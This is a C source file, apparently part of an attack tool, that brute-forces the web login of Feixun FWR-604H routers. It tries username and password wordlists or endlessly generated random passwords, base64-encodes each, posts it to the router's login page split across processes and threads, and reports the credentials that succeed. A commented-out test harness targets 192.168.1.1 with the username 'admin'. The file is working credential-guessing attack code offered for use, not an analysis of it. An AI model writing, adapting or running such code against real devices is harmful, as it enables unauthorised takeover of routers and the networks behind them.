#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "../main.h"
#include "guess.h"

// from ../core/debug.c
extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

// from ../core/str.c
extern int GetRandomPassword(char **rebuf, unsigned int seed, const int length);
extern int SplitURL(const char *url, pSplitURLOutput *output);
extern void FreeRandomPasswordBuff(char *password);
extern void FreeSplitURLBuff(pSplitURLOutput p);
extern void FreeProcessFileBuff(pStrHeader p);
extern int ProcessFile(const char *path, pStrHeader *output, int flag, size_t start, size_t end);
extern int GetFileLines(const char *path, size_t *num);

// from ../core/http.c
extern size_t HTTPPost(const char *url, const char *request, char **response, int debug_level);
extern void FreeHTTPPostBuff(char *p);

// from ../core/base64.c
extern size_t Base64Encode(char **b64message, const unsigned char *buffer, size_t length);
extern size_t Base64Decode(unsigned char **buffer, char *b64message);
extern void FreeBase64(char *b64message);

char *REQUEST;
char *REQUEST_DATA;
char *SUCCESS_OR_NOT;

static int TestMultiProcessControl(const int debug_level, const pStrHeader p)
{
    // test the file process result
    if (debug_level < 2)
    {
        return 0;
    }
    pStrNode t = p->next;
    while (t)
    {
        DisplayInfo("%s", t->str);
        t = t->next;
    }
    return 0;
}

static int MultiProcessControl(const char *path, pStrHeader *output, int flag, const int max_process, const int max_thread, const int serial_num)
{
    // multi process and thread
    // assign task for each thread

    size_t num;

    if (GetFileLines(path, &num) == -1)
    {
        // get the file lines count
        DisplayError("MultiProcessControl GetFileLines failed");
        return -1;
    }

    size_t cut = (num) / ((size_t)max_process * (size_t)max_thread);
    size_t start = serial_num * cut;
    size_t end = (serial_num + 1) * cut;

    if (ProcessFile(path, output, flag, start, end) == -1)
    {
        DisplayError("Processing file failed");
        return -1;
    }

    return 0;
}

static void FreeMatchModel(pMatchOutput p)
{
    free(p);
}

static int MatchModel(pMatchOutput *output, const char *input)
{
    // rude way
    if (strstr(input, "feixun_fwr_604h"))
    {
        (*output) = (pMatchOutput)malloc(sizeof(MatchOutput));
        if (!(*output))
        {
            DisplayError("MatchModel malloc failed");
            return -1;
        }
        (*output)->request = FEIXUN_FWR_604H_REQUEST;
        (*output)->request_data = FEIXUN_FWR_604H_REQUEST_DATA;
        (*output)->success_or_not = FEIXUN_FWR_604H_SUCCESS;
        (*output)->next = NULL;
    }
    else if (strstr(input, "not_sure"))
    {
        //pMatchOutput header = *output;
        MatchModel(output, "feixun_fwr_604h");
        //(*output) = (*output)->next;
        //MatchModel((*output)->next, "others")
    }
    else
    {
        DisplayError("Can not found that model: %s", input);
        return -1;
    }

    return 0;
}

static int CheckResponse(char *response)
{
    // if SUCCESS_OR_NOT in the respoonse, we get the right password

    if (strstr(response, SUCCESS_OR_NOT))
    {
        DisplayInfo("Found the password");
        return 0;
    }

    return -1;
}

static int UListPList(char *url, pStrHeader u_header, pStrHeader p_header, const int debug_level)
{
    // username is a list and password is list too
    pStrNode u = u_header->next;
    pStrNode p;
    char *b64message;
    char *response;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    pSplitURLOutput sp;

    if (SplitURL(url, &sp) == -1)
    {
        DisplayError("SplitURL failed");
        return -1;
    }
    while (u)
    {
        p = p_header->next;
        while (p)
        {
            // base64
            if (!memset(request, 0, sizeof(request)))
            {
                DisplayError("UListPlist memset failed");
                return -1;
            }
            if (!memset(data, 0, sizeof(data)))
            {
                DisplayError("UListPlist memset failed");
                return -1;
            }
            if (Base64Encode(&b64message, (unsigned char *)p->str, strlen(p->str)) == -1)
            {
                DisplayError("Base64Encode failed");
                return -1;
            }

            // combined data now
            if (!sprintf(data, REQUEST_DATA, u->str, b64message))
            {
                DisplayError("UListPlist sprintf failed");
                return -1;
            }
            if (!sprintf(request, REQUEST, sp->host, url, strlen(data), data))
            {
                DisplayError("UListPlist sprintf failed");
                return -1;
            }

            // send now
            DisplayDebug(DEBUG_LEVEL_1, debug_level, "try username: %s, password: %s", u->str, p->str);
            if (HTTPPost(url, request, &response, 0) == -1)
            {
                DisplayError("HTTPPost failed");
                return -1;
            }

            // for debug use
            DisplayDebug(DEBUG_LEVEL_2, debug_level, "%s", response);
            if (CheckResponse(response) == 0)
            {
                DisplayInfo("Username: %s - Password: %s", u->str, p->str);
                return 0;
            }
            FreeHTTPPostBuff(response);
            FreeBase64(b64message);
            p = p->next;
        }
        u = u->next;
    }
    FreeSplitURLBuff(sp);

    return 0;
}

static int UOnePRandom(const char *url, const char *username, unsigned int seed, const int length, const int debug_level)
{
    // just one username and use random password

    char *password;
    char *b64message;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    char *response;
    pSplitURLOutput sp;

    if (SplitURL(url, &sp) == -1)
    {
        DisplayError("SplitURL failed");
        return -1;
    }

    for (;;)
    {
        ++seed;
        if (seed > 1024)
        {
            seed = 0;
        }
        if (GetRandomPassword(&password, seed, length) == -1)
        {
            DisplayError("GetRandomPassword failed");
            return -1;
        }

        // base64
        if (Base64Encode(&b64message, (unsigned char *)password, strlen(password)) == -1)
        {
            DisplayError("Base64Encode failed");
            return -1;
        }

        // combined data now
        if (!sprintf(data, REQUEST_DATA, username, b64message))
        {
            DisplayError("UOnePRandom sprintf failed");
            return -1;
        }
        if (!sprintf(request, REQUEST, sp->host, url, strlen(data), data))
        {
            DisplayError("UOnePRandom sprintf failed");
            return -1;
        }

        // send now
        DisplayDebug(DEBUG_LEVEL_1, debug_level, "try username: %s, password: %s", username, password);
        if (HTTPPost(url, request, &response, 0) == -1)
        {
            DisplayError("HTTPPost failed");
            return -1;
        }
        // for debug
        DisplayDebug(DEBUG_LEVEL_2, debug_level, "%s", response);
        if (CheckResponse(response) == 0)
        {
            DisplayInfo("Username: %s - Password: %s", username, password);
            return 0;
        }

        FreeHTTPPostBuff(response);
        FreeRandomPasswordBuff(password);
        FreeBase64(b64message);
    }

    return 0;
}

static int UOnePList(const char *url, const char *username, const pStrHeader p_header, const int debug_level)
{
    pStrNode p = p_header->next;
    char *b64message;
    char *response;
    char request[strlen(REQUEST) + SEND_DATA_SIZE + 1];
    char data[SEND_DATA_SIZE + 1];
    pSplitURLOutput sp;

    if (SplitURL(url, &sp) == -1)
    {
        DisplayError("SplitURL failed");
        return -1;
    }

    while (p)
    {
        // base64
        if (!memset(request, 0, sizeof(request)))
        {
            DisplayError("UOnePList memset failed");
            return -1;
        }
        if (!memset(data, 0, sizeof(data)))
        {
            DisplayError("UOnePList memset failed");
            return -1;
        }
        if (Base64Encode(&b64message, (unsigned char *)p->str, strlen(p->str)) == -1)
        {
            DisplayError("Base64Encode failed");
            return -1;
        }

        // combined data now
        if (!sprintf(data, REQUEST_DATA, username, b64message))
        {
            DisplayError("UOnePList sprintf failed");
            return -1;
        }
        if (!sprintf(request, REQUEST, sp->host, url, strlen(data), data))
        {
            DisplayError("UOnePList sprintf failed");
            return -1;
        }

        // send now
        DisplayDebug(DEBUG_LEVEL_1, debug_level, "try username: %s, password: %s", username, p->str);
        if (HTTPPost(url, request, &response, 0) == -1)
        {
            DisplayError("HTTPPost failed");
            return -1;
        }

        DisplayDebug(DEBUG_LEVEL_2, debug_level, "%s", response);
        if (CheckResponse(response) == 0)
        {
            DisplayInfo("Username: %s - Password: %s", username, p->str);
            return 0;
        }
        FreeHTTPPostBuff(response);
        FreeBase64(b64message);
        p = p->next;
    }

    return 0;
}

int Attack_GuessUsernamePassword(pInput input)
{
    // start attack

    pMatchOutput mt;
    if (MatchModel(&mt, input->model_type) == -1)
    {
        DisplayError("MatchModel failed");
        return -1;
    }
    REQUEST = mt->request;
    REQUEST_DATA = mt->request_data;
    SUCCESS_OR_NOT = mt->success_or_not;

    if (strlen(input->username_path) > 0)
    {
        // if path existed, ignore the usename
        pStrHeader u_header;
        if (MultiProcessControl(input->username_path, &u_header, 0, input->max_process, input->max_thread, input->serial_num) == -1)
        {
            DisplayError("MultiProcessControl failed");
            return -1;
        }
        TestMultiProcessControl(input->debug_level, u_header);
        if (strlen(input->password_path) > 0)
        {
            pStrHeader p_header;
            if (MultiProcessControl(input->password_path, &p_header, 1, input->max_process, input->max_thread, input->serial_num) == -1)
            {
                DisplayError("MultiProcessControl failed");
                return -1;
            }
            TestMultiProcessControl(input->debug_level, p_header);
            if (UListPList(input->address, u_header, p_header, input->debug_level) == -1)
            {
                DisplayError("UListPList failed");
                return -1;
            }
            FreeProcessFileBuff(u_header);
            FreeProcessFileBuff(p_header);
        }
        // else will never happen
    }
    else if (strlen(input->username) > 0)
    {
        // use one username
        if (strlen(input->password_path) > 0)
        {
            pStrHeader p_header;
            if (MultiProcessControl(input->password_path, &p_header, 1, input->max_process, input->max_thread, input->serial_num) == -1)
            {
                DisplayError("MultiProcessControl failed");
                return -1;
            }
            TestMultiProcessControl(input->debug_level, p_header);
            /*
            if (UOnePList(input->address, input->username, p_header, input->debug_level) == -1)
            {
                DisplayError("UOnePList failed");
                return -1;
            }
            */
            FreeProcessFileBuff(p_header);
        }
        else
        {
            if (UOnePRandom(input->address, input->username, (unsigned int)input->seed, input->random_password_length, input->debug_level) == -1)
            {
                DisplayError("UOnePRandom failed");
                return -1;
            }
        }
    }
    else
    {
        DisplayError("Input illegal");
        return -1;
    }

    FreeMatchModel(mt);
    return 0;
}

/*
int main(void)
{

    pInput t_input = (pInput)malloc(sizeof(Input));
    t_input->max_process = 1;
    t_input->max_thread = 1;
    t_input->serial_num = 0;
    memset(t_input->username, 0, sizeof(t_input->username));
    strncpy(t_input->username, "admin", strlen("admin"));
    t_input->debug_level = 1;
    //strncpy(t_input->username_path, "username1.txt", strlen("username1.txt"));
    //memset(t_input->password_path, 0, sizeof(t_input->password_path));
    //strncpy(t_input->password_path, "password.txt", strlen("password.txt"));
    t_input->seed = 10;
    t_input->random_password_length = 8;
    strcpy(t_input->model_type, "feixun_fwr_604h");
    strcpy(t_input->address, "http://192.168.1.1:80/login.asp");

    Attack_GuessUsernamePassword(t_input);
    return 0;
}
*/